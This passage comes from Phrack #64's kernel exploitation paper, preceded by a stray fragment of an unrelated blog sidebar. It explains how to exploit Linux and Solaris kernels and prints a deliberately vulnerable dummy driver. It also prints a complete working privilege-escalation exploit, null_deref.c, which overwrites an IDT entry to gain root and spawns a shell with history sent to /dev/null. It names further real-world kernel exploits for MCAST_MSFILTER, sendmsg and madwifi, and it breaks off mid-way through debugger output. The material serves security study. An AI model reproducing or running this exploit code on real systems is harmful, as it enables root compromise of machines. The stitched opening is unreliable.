[77]\u25ba  [78]2010 (2)\n+ [79]\u25ba  [80]February (1)\n+ [81]\u25ba  [82]January (1)\n* [83]\u25ba  [84]2009 (2)\n+ [85]\u25ba  [86]December (1)\n+ [87]\u25ba  [88]November (1)\nSubscribe To\n[arrow_dropdown.gif] Posts\n[89][subscribe-netvibes.png] [90][subscribe-yahoo.png]\n[91][icon_feed12.png] Atom\n[arrow_dropdown.gif] Posts\n[arrow_dropdown.gif] Comments\n[92][subscribe-netvibes.png] [93][subscribe-yahoo.png]\n[94][icon_feed12.png] Atom\n[arrow_dropdown.gif] Comments\nLinks\n* [95]Microsoft Security Response Center\n* [96]Offensive Security\n* [97]SANS Incident desk\nAwesome Inc. theme. Powered by [98]Blogger."}
{"text":"[ [1]News ] [ [2]Paper Feed ] [ [3]Issues ] [ [4]Authors ] [\n[5]Archives ] [ [6]Contact ]\n..[ Phrack Magazine ]..\n.:: Attacking the Core: Kernel Exploitation Notes ::.\n__________________________________________________________________\nIssues: [ [7]1 ] [ [8]2 ] [ [9]3 ] [ [10]4 ] [ [11]5 ] [ [12]6 ]\n[ [13]7 ] [ [14]8 ] [ [15]9 ] [ [16]10 ] [ [17]11 ] [ [18]12 ]\n[ [19]13 ] [ [20]14 ] [ [21]15 ] [ [22]16 ] [ [23]17 ] [ [24]18 ]\n[ [25]19 ] [ [26]20 ] [ [27]21 ] [ [28]22 ] [ [29]23 ] [ [30]24 ]\n[ [31]25 ] [ [32]26 ] [ [33]27 ] [ [34]28 ] [ [35]29 ] [ [36]30 ]\n[ [37]31 ] [ [38]32 ] [ [39]33 ] [ [40]34 ] [ [41]35 ] [ [42]36 ]\n[ [43]37 ] [ [44]38 ] [ [45]39 ] [ [46]40 ] [ [47]41 ] [ [48]42 ]\n[ [49]43 ] [ [50]44 ] [ [51]45 ] [ [52]46 ] [ [53]47 ] [ [54]48 ]\n[ [55]49 ] [ [56]50 ] [ [57]51 ] [ [58]52 ] [ [59]53 ] [ [60]54 ]\n[ [61]55 ] [ [62]56 ] [ [63]57 ] [ [64]58 ] [ [65]59 ] [ [66]60 ]\n[ [67]61 ] [ [68]62 ] [ [69]63 ] [ [70]64 ] [ [71]65 ] [ [72]66 ]\n[ [73]67 ] [ [74]68 ] [ [75]69 ] [ [76]70 ]\n[77]Get tar.gz\nCurrent issue : #[78]64 | Release date : 2007-05-27 | Editor : The\nCircle of Lost Hackers\n[79]Introduction The Circle of Lost Hackers\n[80]Phrack Prophile of the new editors The Circle of Lost Hackers\n[81]Phrack World News The Circle of Lost Hackers\n[82]A brief history of the Underground scene Duvel\n[83]Hijacking RDS TMC traffic information signal lcars & danbia\n[84]Attacking the Core: Kernel Exploitation Notes twiz & sgrakkyu\n[85]The revolution will be on YouTube gladio\n[86]Automated vulnerability auditing in machine code Tyler Durden\n[87]The use of set_head to defeat the wilderness g463\n[88]Cryptanalysis of DPA-128 sysk\n[89]Mac OS X Wars - A XNU Hope nemo\n[90]Hacking deeper in the system scythale\n[91]Remote blind TCP\/IP spoofing lkm\n[92]Know your enemy: Facing the cops Lance\n[93]The art of exploitation: Autopsy of cvsxpl Ac1dB1tch3z\n[94]Hacking your brain: The projection of consciousness keptune\n[95]International scenes Various\nTitle : Attacking the Core: Kernel Exploitation Notes\nAuthor : twiz & sgrakkyu\n_                                                  _\n_\/B\\_                                              _\/W\\_\n(* *)              Phrack #64 file 6               (* *)\n| - |                                              | - |\n|   | Attacking the Core : Kernel Exploiting Notes |   |\n|   |                                              |   |\n|   |       By sqrkkyu <sgrakkyu@antifork.org>     |   |\n|   |          twzi <twiz@email.it>                |   |\n|   |                                              |   |\n(______________________________________________________)\n==Phrack Inc.==\nVolume 0x00, Issue 0x00, Phile #0x00 of 0x00\n|=------------=[ Attacking the Core : Kernel Exploiting Notes ]=---------=|\n|=-----------------------------------------------------------------------=|\n|=-------------=[ sgrakkyu@antifork.org and twiz@email.it ]=-------------=|\n|=------------------------=[ February 12 2007 ]=-------------------------=|\n------[  Index\n1 - The playground\n1.1 - Kernel\/Userland virtual address space layouts\n1.2 - Dummy device driver and real vulnerabilities\n1.3 - Notes about information gathering\n2 - Kernel vulnerabilities and bugs\n2.1 - NULL\/userspace dereference vulnerabilities\n2.1.1 - NULL\/userspace dereference vulnerabilities : null_deref.c\n2.2 - The Slab Allocator\n2.2.1 - Slab overflow vulnerabilities\n2.2.2 - Slab overflow exploiting : MCAST_MSFILTER\n2.2.3 - Slab overflow vulnerabilities : Solaris notes\n2.3 - Stack overflow vulnerabilities\n2.3.1 - UltraSPARC exploiting\n2.3.2 - A reliable Solaris\/UltraSPARC exploit\n2.4 - A primer on logical bugs : race conditions\n2.4.1 - Forcing a kernel path to sleep\n2.4.2 - AMD64 and race condition exploiting: sendmsg\n3 - Advanced scenarios\n3.1 - PaX KERNEXEC & separated kernel\/user space\n3.2 - Remote Kernel Exploiting\n3.2.1 - The Network Contest\n3.2.2 - Stack Frame Flow Recovery\n3.2.3 - Resources Restoring\n3.2.4 - Copying the Stub\n3.2.5 - Executing Code in Userspace Context [Gimme Life!]\n3.2.6 - The Code : sendtwsk.c\n4 - Final words\n5 - References\n6 - Sources : drivers and exploits [stuff.tgz]\n------[ Intro\nThe latest years have seen an increasing interest towards kernel based\nexplotation. The growing diffusion of \"security prevention\" approaches\n(no-exec stack, no-exec heap, ascii-armored library mmapping, mmap\/stack\nand generally virtual layout randomization, just to point out the most\nknown) has\/is made\/making userland explotation harder and harder.\nMoreover there has been an extensive work of auditing on application codes,\nso that new bugs are generally more complex to handle and exploit.\nThe attentions has so turned towards the core of the operating systems,\ntowards kernel (in)security. This paper will attempt to give an insight\ninto kernel explotation, with examples for IA-32, UltraSPARC and AMD64.\nLinux and Solaris will be the target operating systems. More precisely, an\narchitecture on turn will be the main covered for the three main\nexploiting demonstration categories : slab (IA-32), stack (UltraSPARC) and\nrace condtion (AMD64). The details explained in those 'deep focus' apply,\nthou, almost in toto to all the others exploiting scenarios.\nSince explotation examples are surely interesting but usually do not show\nthe \"effective\" complexity of taking advantages of vulnerabilities, a\ncouple of working real-life exploits will be presented too.\n------[ 1 - The playground\nLet's just point out that, before starting : \"bruteforcing\" and \"kernel\"\naren't two words that go well together. One can't just crash over and\nover the kernel trying to guess the right return address or the good\nalignment. An error in kernel explotation leads usually to a crash,\npanic or unstable state of the operating system.\nThe \"information gathering\" step is so definitely important, just like\na good knowledge of the operating system layout.\n---[ 1.1 - Kernel\/Userland virtual address space layouts\nFrom the userland point of view, we don't see almost anything of the\nkernel layout nor of the addresses at which it is mapped [there are\nindeed a couple of information that we can gather from userland, and\nwe're going to point them out after].\nNetherless it is from the userland that we have to start to carry out our\nattack and so a good knowledge of the kernel virtual memory layout\n(and implementation) is, indeed, a must.\nThere are two possible address space layouts :\n- kernel space on behalf of user space (kernel page tables are\nreplicated over every process; the virtual address space is splitted in\ntwo parts, one for the kernel and one for the processes).\nKernels running on x86, AMD64 and sun4m\/sun4d architectures usually have\nthis kind of implementation.\n- separated kernel and process address space (both can use the whole\naddress space). Such an implementation, to be efficient, requires a\ndedicated support from the underlaining architecture. It is the case of\nthe primary and secondary context register used in conjunction with the\nASI identifiers on the UltraSPARC (sun4u\/sun4v) architecture.\nTo see the main advantage (from an exploiting perspective) of the first\napproach over the second one we need to introduce the concept of\n\"process context\".\nAny time the CPU is in \"supervisor\" mode (the well-known ring0 on ia-32),\nthe kernel path it is executing is said to be in interrupt context if it\nhasn't a backing process.\nCode in interrupt context can't block (for example waiting for demand\npaging to bring in a referenced userspace page): the scheduler is\nunable to know what to put to sleep (and what to wake up after).\nCode running in process context has instead an associated process\n(usually the one that \"generated\" the kernel code path, for example\nissuing a systemcall) and is free to block\/sleep (and so, it's free to\nreference the userland virtual address space).\nThis is a good news on systems which implement a combined user\/kernel\naddress space, since, while executing at kernel level, we can\ndereference (or jump to) userland addresses.\nThe advantages are obvious (and many) :\n- we don't have to \"guess\" where our shellcode will be and we can\nwrite it in C (which makes easier the writing, if needed, of long and\nsomehow complex recovery code)\n- we don't have to face the problem of finding a suitable large and\nsafe place to store it.\n- we don't have to worry about no-exec page protection (we're free to\nmmap\/mremap as we wish, and, obviously, load directly the code in\n.text segment, if we don't need to patch it at runtime).\n- we can mmap large portions of the address space and fill them with\nnops or nop-alike code\/data (useful when we don't completely\ncontrol the return address or the dereference)\n- we can easily take advantage of the so-called \"NULL pointer\ndereference bugs\" (\"technically\" described later on)\nThe space left to the kernel is so limited in size : on the x86\narchitecture it is 1 Gigabyte on Linux and it fluctuates on Solaris\ndepending on the amount of physical memory (check\nusr\/src\/uts\/i86pc\/os\/startup.c inside Opensolaris sources).\nThis fluctuation turned out to be necessary to avoid as much as possible\nvirtual memory ranges wasting and, at the same time, avoid pressure over\nthe space reserved to the kernel.\nThe only limitation to kernel (and processes) virtual space on systems\nimplementing an userland\/kerneland separated address space is given by the\narchitecture (UltraSPARC I and II can reference only 44bit of the whole\n64bit addressable space. This VA-hole is placed among 0x0000080000000000\nand 0xFFFFF7FFFFFFFFFF).\nThis memory model makes explotation indeed harder, because we can't\ndirectly dereference the userspace. The previously cited NULL pointer\ndereferences are pretty much un-exploitable.\nMoreover, we can't rely on \"valid\" userland addresses as a place to store\nour shellcode (or any other kernel emulation data), neither we can \"return\nto userspace\".\nWe won't go more in details here with a teorical description of the\narchitectures (you can check the reference manuals at [1], [2] and [3])\nsince we've preferred to couple the analysis of the architectural and\noperating systems internal aspects relevant to explotation with the\neffective exploiting codes presentation.\n---[ 1.2 - Dummy device driver and real vulnerabilities\nAs we said in the introduction, we're going to present a couple of real\nworking exploit, hoping to give a better insight into the whole kernel\nexplotation process.\nWe've written exploit for :\n-  MCAST_MSFILTER vulnerability [4], used to demonstrate kernel slab\noverflow exploiting\n-  sendmsg vulnerability [5], used to demonstrate an effective race\ncondition (and a stack overflow on AMD64)\n-  madwifi SIOCGIWSCAN buffer overflow [21], used to demonstrate a real\nremote exploit for the linux kernel. That exploit was already released\nat [22] before the exit of this paper (which has a more detailed\ndiscussion of it and another 'dummy based' exploit for a more complex\nscenario)\nMoreover, we've written a dummy device driver (for Linux and Solaris) to\ndemonstrate with examples the techniques presented.\nA more complex remote exploit (as previously mentioned) and an exploit\ncapable to circumvent Linux with PaX\/KERNEXEC (and userspace\/kernelspace\nseparation) will be presented too.\n---[ 1.3 - Notes about information gathering\nRemember when we were talking about information gathering ? Nearly every\noperating systems 'exports' to userland information useful for developing\nand debugging. Both Linux and Solaris (we're not taking in account now\n'security patches') expose readable by the user the list and addresses of\ntheir exported symbols (symbols that module writer can reference) :\n\/proc\/ksyms on Linux 2.4, \/proc\/kallsyms on Linux 2.6 and \/dev\/ksyms on\nSolaris (the first two are text files, the last one is an ELF with SYMTAB\nsection).\nThose files provide useful information about what is compiled in inside\nthe kernel and at what addresses are some functions and structs, addresses\nthat we can gather at runtime and use to increase the reliability of our\nexploit.\nBut theese information could be missing on some environment, the \/proc\nfilesystem could be un-mounted or the kernel compiled (along with some\nsecurity switch\/patch) to not export them.\nThis is more a Linux problem than a Solaris one, nowadays. Solaris exports\nway more information than Linux (probably to aid in debugging without\nhaving the sources) to the userland. Every module is shown with its\nloading address by 'modinfo', the proc interface exports the address of\nthe kernel 'proc_t' struct to the userland (giving a crucial entrypoint,\nas we will see, for the explotation on UltraSPARC systems) and the 'kstat'\nutility lets us investigate on many kernel parameters.\nIn absence of \/proc (and \/sys, on Linux 2.6) there's another place we can\ngather information from, the kernel image on the filesystem.\nThere are actually two possible favourable situations :\n- the image is somewhere on the filesystem and it's readable, which is\nthe default for many Linux distributions and for Solaris\n- the target host is running a default kernel image, both from\ninstallation or taken from repository. In that situation is just a\nmatter of recreating the same image on our system and infere from it.\nThis should be always possible on Solaris, given the patchlevel (taken\nfrom 'uname' and\/or 'showrev -p').\nThings could change if OpenSolaris takes place, we'll see.\nThe presence of the image (or the possibility of knowing it) is crucial\nfor the KERN_EXEC\/separated userspace\/kernelspace environment explotation\npresented at the end of the paper.\nGiven we don't have exported information and the careful administrator has\nremoved running kernel images (and, logically, in absence of kernel memory\nleaks ;)) we've one last resource that can help in explotation : the\narchitecture.\nLet's take the x86 arch, a process running at ring3 may query the logical\naddress and offset\/attribute of processor tables GDT,LDT,IDT,TSS :\n- through 'sgdt' we get the base address and max offset of the GDT\n- through 'sldt' we can get the GDT entry index of current LDT\n- through 'sidt' we can get the base address and max offset of IDT\n- through 'str'  we can get the GDT entry index of the current TSS\nThe best choice (not the only one possible) in that case is the IDT. The\npossibility to change just a single byte in a controlled place of it\nleads to a fully working reliable exploit [*].\n[*] The idea here is to modify the MSB of the base_address of an IDT entry\nand so \"hijack\" the exception handler. Logically we need a controlled\nbyte overwriting or a partially controlled one with byte value below\nthe 'kernelbase' value, so that we can make it point into the userland\nportion. We won't go in deeper details about the IDT\nlayout\/implementation here, you can find them inside processor manuals\n[1] and kad's phrack59 article \"Handling the Interrupt Descriptor\nTable\" [6].\nThe NULL pointer dereference exploit presented for Linux implements\nthis technique.\nAs important as the information gathering step is the recovery step, which\naims to leave the kernel in a consistent state. This step is usually\nperformed inside the shellcode itself or just after the exploit has\n(successfully) taken place, by using \/dev\/kmem or a loadable module (if\npossible).\nThis step is logically exploit-dependant, so we will just explain it along\nwith the examples (making a categorization would be pointless).\n------[ 2 - Kernel vulnerabilities and bugs\nWe start now with an excursus over the various typologies of kernel\nvulnerabilities. The kernel is a big and complex beast, so even if we're\ngoing to track down some \"common\" scenarios, there are a lot of more\npossible \"logical bugs\" that can lead to a system compromise.\nWe will cover stack based, \"heap\" (better, slab) based and NULL\/userspace\ndereference vulnerabilities. As an example of a \"logical bug\" a whole\nchapter is dedicated to race condition and techniques to force a kernel\npath to sleep\/reschedule (along with a real exploit for the sendmsg [4]\nvulnerability on AMD64).\nWe won't cover in this paper the range of vulnerabilities related to\nvirtual memory logical errors, since those have been already extensively\ndescribed and cleverly exploited, on Linux, by iSEC [7] people.\nMoreover, it's nearly useless, in our opinion, to create a \"crafted\"\ndemonstrative vulnerable code for logical bugs and we weren't aware of any\n_public_ vuln of this kind on Solaris. If you are, feel free to submit it,\nwe'll be happy to work over ;).\n---[ 2.1 - NULL\/userspace dereference vulnerabilities\nThis kind of vulnerability derives from the using of a pointer\nnot-initialized (generally having a NULL value) or trashed, so that it\npoints inside the userspace part of the virtual memory address space.\nThe normal behaviour of an operating system in such a situation is an oops\nor a crash (depending on the degree of severity of the dereference) while\nattempting to access un-mapped memory.\nBut we can, obviously, mmap that memory range and let the kernel find\n\"valid\" malicius data. That's more than enough to gain root priviledges.\nWe can delineate two possible scenarios :\n- instruction pointer modification (direct call\/jmp dereference,\ncalled function pointers inside a struct, etc)\n- \"controlled\" write on kernelspace\nThe first kind of vulnerability is really trivial to exploit, it's just a\nmatter of mmapping the referenced page and put our shellcode there.\nIf the dereferenced address is a struct with inside a function pointer (or\na chain of struct with somewhere a function pointer), it is just a matter\nof emulating in userspace those struct, make point the function pointer\nto our shellcode and let\/force the kernel path to call it.\nWe won't show an example of this kind of vulnerability since this is the\n\"last stage\" of any more complex exploit (as we will see, we'll be always\ntrying, when possible, to jump to userspace).\nThe second kind of vulnerability is a little more complex, since we can't\ndirectly modify the instruction pointer, but we've the possibility to\nwrite anywhere in kernel memory (with controlled or uncontrolled data).\nLet's get a look to that snipped of code, taken from our Linux dummy\ndevice driver :\n< stuff\/drivers\/linux\/dummy.h >\n[...]\nstruct user_data_ioctl\n{\nint size;\nchar *buffer;\n};\n< \/ >\n< stuff\/drivers\/linux\/dummy.c >\nstatic int alloc_info(unsigned long sub_cmd)\n{\nstruct user_data_ioctl user_info;\nstruct info_user *info;\nstruct user_perm *perm;\n[...]\nif(copy_from_user(&user_info,\n(void __user*)sub_cmd,\nsizeof(struct user_data_ioctl)))\nreturn -EFAULT;\nif(user_info.size > MAX_STORE_SIZE)  [1]\nreturn -ENOENT;\ninfo = kmalloc(sizeof(struct info_user), GFP_KERNEL);\nif(!info)\nreturn -ENOMEM;\nperm = kmalloc(sizeof(struct user_perm), GFP_KERNEL);\nif(!perm)\nreturn -ENOMEM;\ninfo->timestamp = 0;\/\/sched_clock();\ninfo->max_size  = user_info.size;\ninfo->data = kmalloc(user_info.size, GFP_KERNEL); [2]\n\/* unchecked alloc *\/\nperm->uid = current->uid;\ninfo->data->perm = perm; [3]\nglob_info = info;\n[...]\nstatic int store_info(unsigned long sub_cmd)\n{\n[...]\nglob_info->data->perm->uid = current->uid; [4]\n[...]\n< \/ >\nDue to the integer signedness issue at [1], we can pass a huge value\nto the kmalloc at [2], making it fail (and so return NULL).\nThe lack of checking at that point leaves a NULL value in the info->data\npointer, which is later used, at [3] and also inside store_info at [4] to\nsave the current uid value.\nWhat we have to do to exploit such a code is simply mmap the zero page\n(0x00000000 - NULL) at userspace, make the kmalloc fail by passing a\nnegative value and then prepare a 'fake' data struct in the previously\nmmapped area, providing a working pointers for 'perm' and thus being able\nto write our 'uid' anywhere in memory.\nAt that point we have many ways to exploit the vulnerable code (exploiting\nwhile being able to write anywhere some arbitrary or, in that case,\npartially controlled data is indeed limited only by imagination), but it's\nbetter to find a \"working everywhere\" way.\nAs we said above, we're going to use the IDT and overwrite one of its\nentries (more precisely a Trap Gate, so that we're able to hijack an\nexception handler and redirect the code-flow towards userspace).\nEach IDT entry is 64-bit (8-bytes) long and we want to overflow the\n'base_offset' value of it, to be able to modify the MSB of the exception\nhandler routine address and thus redirect it below PAGE_OFFSET\n(0xc0000000) value.\nSince the higher 16 bits are in the 7th and 8th byte of the IDT entry,\nthat one is our target, but we're are writing at [4] 4 bytes for the 'uid'\nvalue, so we're going to trash the next entry. It is better to use two\nadiacent 'seldomly used' entries (in case, for some strange reason,\nsomething went bad) and we have decided to use the 4th and 5th entries :\n#OF (Overflow Exception) and #BR (BOUND Range Exeeded Exeption).\nAt that point we don't control completely the return address, but that's\nnot a big problem, since we can mmap a large region of the userspace and\nfill it with NOPs, to prepare a comfortable and safe landing point for our\nexploit. The last thing we have to do is to restore, once we get the\ncontrol flow at userspace, the original IDT entries, hardcoding the values\ninside the shellcode stub or using an lkm or \/dev\/kmem patching code.\nAt that point our exploit is ready to be launched for our first\n'rootshell'.\nAs a last (indeed obvious) note, NULL dereference vulnerabilities are\nonly exploitable on 'combined userspace and kernelspace' memory model\noperating systems.\n---[ 2.1.1 - NULL\/userspace dereference vulnerabilities : null_deref.c\n< stuff\/expl\/null_deref.c >\n#include <sys\/ioctl.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <sys\/types.h>\n#include <sys\/stat.h>\n#include <fcntl.h>\n#include <sys\/mman.h>\n#include \"dummy.h\"\n#define DEVICE          \"\/dev\/dummy\"\n#define NOP             0x90\n#define STACK_SIZE      8192\n\/\/#define STACK_SIZE 4096\n#define PAGE_SIZE       0x1000\n#define PAGE_OFFSET     12\n#define PAGE_MASK       ~(PAGE_SIZE -1)\n#define ANTANI          \"antani\"\nuint32_t        bound_check[2]={0x00,0x00};\nextern void     do_it();\nuid_t           UID;\nvoid do_bound_check()\n{\nasm volatile(\"bound %1, %0\\t\\n\" : \"=m\"(bound_check) : \"a\"(0xFF));\n}\n\/* simple shell spown *\/\nvoid get_root()\n{\nchar *argv[] = { \"\/bin\/sh\", \"--noprofile\", \"--norc\", NULL };\nchar *envp[] = { \"TERM=linux\", \"PS1=y0y0\\\\$\", \"BASH_HISTORY=\/dev\/null\",\n\"HISTORY=\/dev\/null\", \"history=\/dev\/null\",\n\"PATH=\/bin:\/sbin:\/usr\/bin:\/usr\/sbin:\/usr\/local\/bin:\/usr\/local\n\/sbin\", NULL };\nexecve(\"\/bin\/sh\", argv, envp);\nfprintf(stderr, \"[**] Execve failed\\n\");\nexit(-1);\n}\n\/* this function is called by fake exception handler: take 0 uid and restore tra\nshed entry *\/\nvoid give_priv_and_restore(unsigned int thread)\n{\nint i;\nunsigned short addr;\nunsigned int* p = (unsigned int*)thread;\n\/* simple trick *\/\nfor(i=0; i < 0x100; i++)\nif( (p[i] == UID) && (p[i+1] == UID) && (p[i+2] == UID) && (p[i+3] == UID) )\np[i] = 0, p[i+1] = 0;\n}\n#define CODE_SIZE       0x1e\nvoid dummy(void)\n{\nasm(\"do_it:;\"\n\"addl $6, (%%esp);\"  \/\/ after bound exception EIP points again to the bound\ninstruction\n\"pusha;\"\n\"movl %%esp, %%eax;\"\n\"andl %0, %%eax;\"\n\"movl (%%eax), %%eax;\"\n\"add $100, %%eax;\"\n\"pushl %%eax;\"\n\"movl $give_priv_and_restore, %%ebx;\"\n\"call *%%ebx;\"\n\"popl %%eax;\"\n\"popa;\"\n\"iret;\"\n\"nop;nop;nop;nop;\"\n:: \"i\"( ~(STACK_SIZE -1))\n);\nreturn;\n}\nstruct idt_struct\n{\nuint16_t limit;\nuint32_t base;\n} __attribute__((packed));\nstatic char *allocate_frame_chunk(unsigned int base_addr,\nunsigned int size,\nvoid* code_addr)\n{\nunsigned int round_addr = base_addr & PAGE_MASK;\nunsigned int diff       = base_addr - round_addr;\nunsigned int len        = (size + diff + (PAGE_SIZE-1)) & PAGE_MASK;\nchar *map_addr = mmap((void*)round_addr,\nlen,\nPROT_READ|PROT_WRITE,\nMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,\n0,\n0);\nif(map_addr == MAP_FAILED)\nreturn MAP_FAILED;\nif(code_addr)\n{\nmemset(map_addr, NOP, len);\nmemcpy(map_addr, code_addr, size);\n}\nelse\nmemset(map_addr, 0x00, len);\nreturn (char*)base_addr;\n}\ninline unsigned int *get_zero_page(unsigned int size)\n{\nreturn (unsigned int*)allocate_frame_chunk(0x00000000, size, NULL);\n}\n#define BOUND_ENTRY 5\nunsigned int get_BOUND_address()\n{\nstruct idt_struct idt;\nasm volatile(\"sidt %0\\t\\n\" : \"=m\"(idt));\nreturn idt.base + (8*BOUND_ENTRY);\n}\nunsigned int prepare_jump_code()\n{\nUID = getuid();       \/* set global uid *\/\nunsigned int base_address = ((UID & 0x0000FF00) << 16) + ((UID & 0xFF) << 16);\nprintf(\"Using base address of: 0x%08x-0x%08x\\n\", base_address, base_address +\n0x20000 -1);\nchar *addr = allocate_frame_chunk(base_address, 0x20000, NULL);\nif(addr == MAP_FAILED)\n{\nperror(\"unable to mmap jump code\");\nexit(-1);\n}\nmemset((void*)base_address, NOP, 0x20000);\nmemcpy((void*)(base_address + 0x10000), do_it, CODE_SIZE);\nreturn base_address;\n}\nint main(int argc, char *argv[])\n{\nstruct user_data_ioctl user_ioctl;\nunsigned int *zero_page, *jump_pages, save_ptr;\nzero_page = get_zero_page(PAGE_SIZE);\nif(zero_page == MAP_FAILED)\n{\nperror(\"mmap: unable to map zero page\");\nexit(-1);\n}\njump_pages = (unsigned int*)prepare_jump_code();\nint ret, fd = open(DEVICE,  O_RDONLY), alloc_size;\nif(argc > 1)\nalloc_size = atoi(argv[1]);\nelse\nalloc_size  = PAGE_SIZE-8;\nif(fd < 0)\n{\nperror(\"open: dummy device\");\nexit(-1);\n}\nmemset(&user_ioctl, 0x00, sizeof(struct user_data_ioctl));\nuser_ioctl.size = alloc_size;\nret = ioctl(fd, KERN_IOCTL_ALLOC_INFO, &user_ioctl);\nif(ret < 0)\n{\nperror(\"ioctl KERN_IOCTL_ALLOC_INFO\");\nexit(-1);\n}\n\/* save old struct ptr stored by kernel in the first word *\/\nsave_ptr = *zero_page;\n\/* compute the new ptr inside the IDT table between BOUND and INVALIDOP except\nion *\/\nprintf(\"IDT bound: %x\\n\", get_BOUND_address());\n*zero_page = get_BOUND_address() + 6;\nuser_ioctl.size=strlen(ANTANI)+1;\nuser_ioctl.buffer=ANTANI;\nret = ioctl(fd, KERN_IOCTL_STORE_INFO, &user_ioctl);\ngetchar();\ndo_bound_check();\n\/* restore trashed ptr *\/\n*zero_page = save_ptr;\nret = ioctl(fd, KERN_IOCTL_FREE_INFO, NULL);\nif(ret < 0)\n{\nperror(\"ioctl KERN_IOCTL_FREE_INFO\");\nexit(-1);\n}\nget_root();\nreturn 0;\n}\n< \/ >\n---[ 2.2 - The Slab Allocator\nThe main purpose of a slab allocator is to fasten up the\nallocation\/deallocation of heavily used small 'objects' and to reduce the\nfragmentation that would derive from using the page-based one.\nBoth Solaris and Linux implement a slab memory allocator which derives\nfrom the one described by Bonwick [8] in 1994 and implemented in Solaris\n2.4.\nThe idea behind is, basically : objects of the same type are grouped\ntogether inside a cache in their constructed form. The cache is divided in\n'slabs', consisting of one or more contiguos page frames.\nEverytime the Operating Systems needs more objects, new page frames (and\nthus new 'slabs') are allocated and the object inside are constructed.\nWhenever a caller needs one of this objects, it gets returned an already\nprepared one, that it has only to fill with valid data. When an object is\n'freed', it doesn't get destructed, but simply returned to its slab and\nmarked as available.\nCaches are created for the most used objects\/structs inside the operating\nsystem, for example those representing inodes, virtual memory areas, etc.\nGeneral-purpose caches, suitables for small memory allocations, are\ncreated too, one for each power of two, so that internal fragmentation is\nguaranted to be at least below 50%.\nThe Linux kmalloc() and the Solaris kmem_alloc() functions use exactly\nthose latter described caches. Since it is up to the caller to 'clean' the\nobject returned from a slab (which could contain 'dead' data), wrapper\nfunctions that return zeroed memory are usually provided too (kzalloc(),\nkmem_zalloc()).\nAn important (from an exploiting perspective) 'feature' of the slab\nallocator is the 'bufctl', which is meaningful only inside a free object,\nand is used to indicate the 'next free object'.\nA list of free object that behaves just like a LIFO is thus created, and\nwe'll see in a short that it is crucial for reliable explotation.\nTo each slab is associated a controlling struct (kmem_slab_t on Solaris,\nslab_t on Linux) which is stored inside the slab (at the start, on Linux,\nat the end, on Solaris) if the object size is below a given limit (1\/8 of\nthe page), or outside it.\nSince there's a 'cache' per 'object type', it's not guaranted at all that\nthose 'objects' will stay exactly in a page boundary inside the slab. That\n'free' space (space not belonging to any object, nor to the slab\ncontrolling struct) is used to 'color' the slab, respecting the object\nalignment (if 'free' < 'alignment' no coloring takes place).\nThe first object is thus saved at a 'different offset' inside the slab,\ngiven from 'color value' * 'alignment', (and, consequently, the same\nhappens to all the subsequent objects), so that object of the same size in\ndifferent slabs will less likely end up in the same hardware cache lines.\nWe won't go more in details about the Slab Allocator here, since it is\nwell and extensively explained in many other places, most notably at [9],\n[10], and [11], and we move towards effective explotation.\nSome more implementation details will be given, thou, along with the\nexploiting techniques explanation.\n---[ 2.2.1 - Slab overflow vulnerabilities\nNOTE: as we said before, Solaris and Linux have two different function to\nalloc from the general purpose caches, kmem_alloc() and kmalloc(). That\ntwo functions behave basically in the same manner, so, from now on we'll\njust use 'kmalloc' and 'kmalloc'ed memory' in the discussion, referring\nthou to both the operating systems implementation.\nA slab overflow is simply the writing past the buffer boundaries of a\nkmalloc'ed object. The result of this overflow can be :\n- overwriting an adiacent in-slab object.\n- overwriting a page next to the slab one, in the case we're overwriting\npast the last object.\n- overwriting the control structure associated with the slab (Solaris\nonly)\nThe first case is the one we're going to show an exploit for. The main\nidea on such a situation is to fill the slabs (we can track the slab\nstatus thanks to \/proc\/slabinfo on Linux and kstat -n 'cache_name' on\nSolaris) so that a new one is necessary.\nWe do that to be sure that we'll have a 'controlled' bufctl : since the\nwhole slabs were full, we got a new page, along with a 'fresh' bufctl\npointer starting from the first object.\nAt that point we alloc two objects, free the first one and trigger the\nvulnerable code : it will request a new object and overwrite right into\nthe previously allocated second one. If a pointer inside this second\nobject is stored and then used (after the overflow) it is under our\ncontrol.\nThis approach is very reliable.\nThe second case is more complex, since we haven't an object with a pointer\nor any modifiable data value of interest to overwrite into. We still have\none chance, thou, using the page frame allocator.\nWe start eating a lot of memory requesting the kind of 'page' we want to\noverflow into (for example, tons of filedescriptor), putting the memory\nunder pressure. At that point we start freeing a couple of them, so that\nthe total amount counts for a page.\nAt that point we start filling the slab so that a new page is requested.\nIf we've been lucky the new page is going to be just before one of the\npreviously allocated ones and we've now the chance to overwrite it.\nThe main point affecting the reliability of such an exploit is :\n- it's not trivial to 'isolate' a given struct\/data to mass alloc at the\nfirst step, without having also other kernel structs\/data growing\ntogether with.\nAn example will clarify : to allocate tons of file descriptor we need\nto create a large amount of threads. That translates in the allocation\nof all the relative control structs which could end up placed right\nafter our overflowing buffer.\nThe third case is possible only on Solaris, and only on slabs which keep\nobjects smaller than 'page_size >> 3'. Since Solaris keeps the kmem_slab\nstruct at the end of the slab we can use the overflow of the last object\nto overwrite data inside it.\nIn the latter two 'typology' of exploit presented we have to take in\naccount slab coloring. Both the operating systems store the 'next color\noffset' inside the cache descriptor, and update it at every slab\nallocation (let's see an example from OpenSolaris sources) :\n< usr\/src\/uts\/common\/os\/kmem.c >\nstatic kmem_slab_t *\nkmem_slab_create(kmem_cache_t *cp, int kmflag)\n{\n[...]\nsize_t color, chunks;\n[...]\ncolor = cp->cache_color + cp->cache_align;\nif (color > cp->cache_maxcolor)\ncolor = cp->cache_mincolor;\ncp->cache_color = color;\n< \/ >\n'mincolor' and 'maxcolor' are calculated at cache creation and represent\nthe boundaries of available caching :\n# uname -a\nSunOS principessa 5.9 Generic_118558-34 sun4u sparc SUNW,Ultra-5_10\n# kstat -n file_cache | grep slab\nslab_alloc                      280\nslab_create                     2\nslab_destroy                    0\nslab_free                       0\nslab_size                       8192\n# kstat -n file_cache | grep align\nalign                           8\n# kstat -n file_cache | grep buf_size\nbuf_size                        56\n# mdb -k\nLoading modules: [ unix krtld genunix ip usba nfs random ptm ]\n> ::sizeof kmem_slab_t\nsizeof (kmem_slab_t) = 0x38\n> ::kmem_cache ! grep file_cache\n00000300005fed88 file_cache                0000 000000       56      290\n> 00000300005fed88::print kmem_cache_t cache_mincolor\ncache_mincolor = 0\n> 00000300005fed88::print kmem_cache_t cache_maxcolor\ncache_maxcolor = 0x10\n> 00000300005fed88::print kmem_cache_t cache_color\ncache_color = 0x10\n> 